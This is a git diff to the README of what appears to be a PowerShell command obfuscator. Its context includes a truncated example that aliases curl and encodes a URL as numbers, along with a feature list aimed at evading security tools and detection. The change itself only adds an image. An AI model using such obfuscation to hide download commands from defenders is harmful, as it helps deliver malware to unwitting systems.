@@ -12,6 +12,9 @@ powershell -Command "new-alias ravnl curl; $bcutn = @(8891,8903,8903,8899,8902,8
 - **URL Obfuscation**: Transforms URL into a series of ASCII values, making them less recognizable to security tools.
 - **Random Variable Generation**: Creates random variable names to further obscure the script and reduce the chance of detection.
 - **CMD Compatibility**: The generated obfuscated script can be executed in the Windows Command Prompt, allowing for seamless integration into various workflows.
+
+![image](https://github.com/user-attachments/assets/56a56fe1-c374-4938-a1cb-ab261569151f)
+
   
 ## Disclaimer
 This tool is intended for educational and security research purposes only. The author is not responsible for misuse or for any damage that may occur from using this tool. It is the end user's responsibility to comply with all applicable laws and regulations. The use of this tool against targets without prior mutual consent is illegal.
